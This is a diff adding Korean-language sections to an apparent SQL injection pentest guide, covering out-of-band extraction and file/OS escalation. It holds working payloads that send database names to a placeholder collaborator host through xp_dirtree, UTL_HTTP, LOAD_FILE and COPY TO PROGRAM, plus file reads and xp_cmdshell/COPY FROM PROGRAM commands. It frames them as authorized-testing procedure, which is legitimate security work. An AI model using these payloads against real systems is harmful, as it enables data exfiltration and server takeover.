@@ -562,6 +562,41 @@ GET /api/users/export?format=xlsx HTTP/1.1
 Host: <TARGET>
 ```
 
+### 13. OOB 추출 (사전 승인 시)
+
+응답 본문·길이·시간 어느 것으로도 참/거짓을 가를 수 없을 때, DBMS가 외부 네트워크 요청을 보낼 수 있으면 DNS/HTTP 콜백으로 확인한다. 외부 통신은 고객사 보안 장비에 로그가 남고 egress 정책에 따라 실패하므로, **사전 승인된 Collaborator/interactsh 도메인에서만** 사용한다. Boolean/Time blind로 판정 가능하면 OOB를 먼저 쓰지 않는다.
+
+- DB 계정 권한, 네트워크 egress, 해당 함수 실행 권한이 모두 있어야 동작한다.
+- 콜백이 오지 않아도 "안전함"을 뜻하지 않는다. egress 차단이 더 흔하다.
+- 반출은 사용자/DB명처럼 짧고 영향 낮은 값만 확인하고, 대량 데이터는 외부로 보내지 않는다.
+
+```sql
+-- MSSQL: UNC 경로로 DNS/SMB 조회 유발 (문장이므로 stacked query 문맥)
+'; EXEC master..xp_dirtree '\\oob-<RANDOM>.<COLLAB>\a'-- -
+-- 데이터를 subdomain에 실어 반출
+'; DECLARE @d varchar(900); SELECT @d=DB_NAME();
+   EXEC('master..xp_dirtree "\\'+@d+'.<COLLAB>\a"')-- -
+```
+
+```sql
+-- Oracle: DNS 조회에 값 결합 (UTL_INADDR, ACL/버전 제약 있음)
+' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.<COLLAB>') FROM dual) IS NOT NULL-- -
+-- HTTP 반출 (UTL_HTTP, network ACL 허용 시)
+' AND (SELECT UTL_HTTP.REQUEST('http://<COLLAB>/?d='||(SELECT user FROM dual)) FROM dual) IS NOT NULL-- -
+```
+
+```sql
+-- MySQL/MariaDB: Windows + FILE 권한 환경에서 UNC 경로로 SMB/DNS 조회
+' AND LOAD_FILE(CONCAT('\\\\', (SELECT DATABASE()), '.<COLLAB>\\a'))-- -
+```
+
+```sql
+-- PostgreSQL: superuser 권한에서 OS 명령 경유 외부 조회
+'; COPY (SELECT '') TO PROGRAM 'nslookup pg-<RANDOM>.<COLLAB>'-- -
+```
+
+SQLite는 내장 네트워크 함수가 없어 DB 자체로는 OOB가 어렵다. 애플리케이션이 결과를 외부로 보내는 경로가 있을 때만 간접적으로 확인한다.
+
 ---
 
 ## 우회 매트릭스
@@ -731,6 +766,40 @@ MySQL/MariaDB 기준 예시다. DBMS가 다르면 catalog 뷰를 바꿔서 같�
 ```
 
 운영 데이터 `UPDATE`는 복구 가능성과 영향 범위를 확인한 뒤 진행한다. DB에서 파일 쓰기나 OS 명령 실행으로 확장 가능한 단서가 보이면 다음 단계로 이어서 확인한다.
+
+### 파일 읽기 / 쓰기 / OS 연계
+
+DB 계정 권한이 높고 설정이 맞으면 파일 읽기·쓰기나 OS 명령으로 확장될 수 있다. 영향이 큰 작업이므로 **사전 승인 범위와 복구 가능성을 먼저 확인**하고, 웹 루트 기록이나 셸 생성 같은 비가역 작업은 별도 승인으로 분리한다. 운영 진단에서는 "권한이 있다"는 사실까지만 입증하고 멈추는 편이 안전하다.
+
+| DBMS | 읽기 | 쓰기 | OS 명령 | 전제 조건 |
+| :--- | :--- | :--- | :--- | :--- |
+| MySQL/MariaDB | `LOAD_FILE()` | `INTO OUTFILE` / `INTO DUMPFILE` | UDF 등 별도 | `FILE` 권한, `secure_file_priv` 허용 경로 |
+| MSSQL | `OPENROWSET(BULK ...)` | — | `xp_cmdshell` | sysadmin, 기능 활성화 |
+| PostgreSQL | `pg_read_file()`, `COPY FROM` | `COPY TO` | `COPY ... FROM PROGRAM` | superuser 또는 해당 role |
+| Oracle | `UTL_FILE.GET_LINE` | `UTL_FILE.PUT_LINE` | Java/PLSQL | 디렉터리 객체, 실행 권한 |
+| SQLite | `ATTACH DATABASE` | `ATTACH DATABASE` | 없음 | DB 파일 경로 접근 |
+
+권한·설정 확인 후 최소 증거만 남긴다.
+
+```sql
+-- MySQL/MariaDB: 읽기
+' UNION SELECT NULL,LOAD_FILE('/etc/hostname'),NULL-- -
+-- 쓰기(웹 루트 기록은 사전 승인 필수) — 마커 파일로 가능 여부만 입증
+' UNION SELECT NULL,'<RANDOM>_marker',NULL INTO OUTFILE '/tmp/<RANDOM>.txt'-- -
+```
+
+```sql
+-- PostgreSQL(superuser): 파일 읽기와 명령 실행 가능 여부
+'; CREATE TEMP TABLE oob_t(x text); COPY oob_t FROM '/etc/hostname'-- -
+'; COPY oob_t FROM PROGRAM 'id'-- -
+```
+
+```sql
+-- MSSQL(sysadmin): 기능 상태 확인 후 최소 명령
+'; EXEC xp_cmdshell 'whoami'-- -
+```
+
+`secure_file_priv`, `xp_cmdshell` 활성화 여부, role/디렉터리 권한처럼 전제 조건이 하나라도 빠지면 실패한다. 실패가 곧 안전은 아니므로 전제 조건과 거부 메시지를 함께 기록한다.
 
 ---
 
